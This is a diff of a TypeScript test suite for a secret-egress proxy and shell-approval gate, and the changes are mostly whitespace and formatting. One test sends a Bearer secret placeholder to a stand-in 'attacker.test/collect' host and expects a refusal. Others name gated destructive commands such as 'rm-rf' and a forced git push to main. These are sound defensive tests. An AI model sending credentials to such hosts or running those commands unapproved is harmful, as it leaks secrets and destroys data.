@@ -51,6 +51,7 @@ describe('placeholders', () => {
     const found = findEgressPlaceholders(
       `Authorization: Bearer ${STRIPE.placeholder}; retry with ${STRIPE.placeholder}`,
     );
+
     expect(found).toEqual([STRIPE.placeholder]);
   });
 
@@ -89,6 +90,7 @@ describe('planEgress', () => {
       { host: 'example.com', url: 'https://example.com/', headers: [['accept', '*/*']] },
       [STRIPE],
     );
+
     expect(plan).toEqual({ kind: 'forward', substitutions: [] });
   });
 
@@ -98,6 +100,7 @@ describe('planEgress', () => {
       url: 'https://api.stripe.com/v1/charges',
       headers: [['authorization', `Bearer ${STRIPE.placeholder}`]],
     }, [STRIPE]);
+
     expect(plan).toEqual({
       kind: 'forward',
       substitutions: [{ bindingId: 'bind-stripe', placeholder: STRIPE.placeholder }],
@@ -110,6 +113,7 @@ describe('planEgress', () => {
       url: `https://api.stripe.com/v1/charges?key=${STRIPE.placeholder}`,
       headers: [],
     }, [STRIPE]);
+
     expect(plan.kind).toBe('forward');
     expect(plan.kind === 'forward' && plan.substitutions).toHaveLength(1);
   });
@@ -120,6 +124,7 @@ describe('planEgress', () => {
       url: 'https://attacker.test/collect',
       headers: [['authorization', `Bearer ${STRIPE.placeholder}`]],
     }, [STRIPE]);
+
     expect(plan.kind).toBe('refuse');
     expect(plan.kind === 'refuse' && plan.status).toBe(403);
     // The refusal names the destination and the binding, never the secret.
@@ -133,6 +138,7 @@ describe('planEgress', () => {
       url: 'https://api.stripe.com/v1/charges',
       headers: [['authorization', `Bearer ${placeholder('z')}`]],
     }, [STRIPE]);
+
     expect(plan.kind).toBe('refuse');
     expect(plan.kind === 'refuse' && plan.status).toBe(403);
   });
@@ -143,6 +149,7 @@ describe('planEgress', () => {
       url: 'https://api.stripe.com/',
       headers: [['authorization', `Bearer ${STRIPE.placeholder}`]],
     }, []);
+
     expect(plan.kind).toBe('refuse');
   });
 });
@@ -186,6 +193,7 @@ describe('grants are the workspace set, or a subset', () => {
       { rule: egressSecretRule('bind-prod-db'), executor: 'sandbox' },
       { rule: 'rm-rf', executor: 'laptop' },
     ];
+
     const resolved = resolveInheritedGrants({ root, own });
     expect(resolved).toEqual([{ rule: 'rm-rf', executor: 'sandbox' }]);
     expect(grantsAreSubset(resolved, root)).toBe(true);
@@ -201,10 +209,15 @@ describe('grants are the workspace set, or a subset', () => {
 describe('inherited approval policy', () => {
   function rootSource(mode: ShellApprovalMode, grants: ApprovalGrant[], own: ApprovalGrant[] | null = null) {
     let fetches = 0;
+
     return {
       calls: () => fetches,
       source: {
-        fetchRoot: async () => { fetches += 1; return { mode, grants }; },
+        fetchRoot: async () => {
+          fetches += 1;
+
+          return { mode, grants };
+        },
         ownGrants: () => own,
       },
     };
@@ -236,14 +249,21 @@ describe('inherited approval policy', () => {
    *  `sandbox` does not exempt it — the same standing an egress binding has. */
   const GATED = 'git push --force origin main';
   const GATED_RULE = 'git-force-push';
+
   function ladder(policy: ShellApprovalPolicy) {
     const ran: string[] = [];
+
     const run = gateExec<string>(
-      async (command) => { ran.push(command); return `ran:${command}`; },
+      async (command) => {
+        ran.push(command);
+
+        return `ran:${command}`;
+      },
       (error) => error.message,
       'sandbox',
       policy,
     );
+
     return { ran, run: () => run(GATED) };
   }
 
@@ -261,6 +281,7 @@ describe('inherited approval policy', () => {
       fetchRoot: () => Promise.reject(new Error('root DO unreachable')),
       ownGrants: () => null,
     });
+
     const gate = ladder(policy);
     await expect(gate.run()).rejects.toThrow('root DO unreachable');
     expect(gate.ran).toEqual([]);
@@ -291,12 +312,14 @@ describe('scrubbing what comes back', () => {
 
   async function pump(chunks: string[]): Promise<string> {
     const encoder = new TextEncoder();
+
     const source = new ReadableStream<Uint8Array>({
       start(controller) {
         for (const chunk of chunks) controller.enqueue(encoder.encode(chunk));
         controller.close();
       },
     });
+
     return new Response(source.pipeThrough(createScrubStream(REPLACEMENTS))).text();
   }
 
@@ -329,12 +352,15 @@ describe('scrubbing what comes back', () => {
   test('binary bytes survive scrubbing undecoded', async () => {
     // A PNG header is not UTF-8. Decoding to scrub would corrupt it.
     const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe]);
+
     const source = new ReadableStream<Uint8Array>({
       start(controller) { controller.enqueue(png); controller.close(); },
     });
+
     const out = new Uint8Array(await new Response(
       source.pipeThrough(createScrubStream(REPLACEMENTS)),
     ).arrayBuffer());
+
     expect([...out]).toEqual([...png]);
   });
 
@@ -342,6 +368,7 @@ describe('scrubbing what comes back', () => {
     const source = new ReadableStream<Uint8Array>({
       start(controller) { controller.enqueue(new TextEncoder().encode(SECRET)); controller.close(); },
     });
+
     expect(await new Response(source.pipeThrough(createScrubStream([]))).text()).toBe(SECRET);
   });
 });
